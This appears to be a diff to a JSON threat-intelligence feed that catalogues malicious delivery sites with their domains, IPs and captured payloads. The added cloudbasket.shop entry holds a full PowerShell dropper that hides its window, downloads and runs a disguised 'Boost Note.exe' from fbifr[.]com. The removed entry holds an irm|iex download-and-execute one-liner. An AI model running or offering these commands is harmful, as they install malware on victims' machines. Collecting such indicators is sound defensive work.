@@ -1,5 +1,49 @@
 [
   {
+    "UrlDomain": "cloudbasket.shop",
+    "DeliveryUrl": [
+      "fbifr.com"
+    ],
+    "PayloadUrl": [
+      "https://fbifr.com/eoN"
+    ],
+    "IP": [
+      "95.217.198.242"
+    ],
+    "Related": [
+      {
+        "Value": "https://fbifr.com/ca.js?ver=1.0.0",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://fbifr.com/kj",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://fbifr.com/",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://fbifr.com/ss5",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://fbifr.com/uzo9",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://fbifr.com/lr",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://fbifr.com/eoN"
+    ],
+    "ReportId": "cmwp94lsd226p0oml211sh43e",
+    "ScannedAt": "2026-11-20T17:27:10.495000+00:00"
+  },
+  {
     "UrlDomain": "tekstar.org",
     "DeliveryUrl": [
       "j7tracker.gb.net"
@@ -12393,31 +12437,5 @@
     ],
     "ReportId": "cmwdu79y204vg0omlk6z3bhq8",
     "ScannedAt": "2026-11-12T17:43:52.883000+00:00"
-  },
-  {
-    "UrlDomain": "achupallasfarms.co",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "188.114.97.0"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/874cc01bf111137b",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=8402fb1338daab6a166e91aa8c92a20798acfa98fb75c5a2",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/874cc01bf111137b'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/874cc01bf111137b"
-    ],
-    "ReportId": "cmwdt7rly04sw0oml797g7obw",
-    "ScannedAt": "2026-11-12T17:16:16.187000+00:00"
   }
 ]
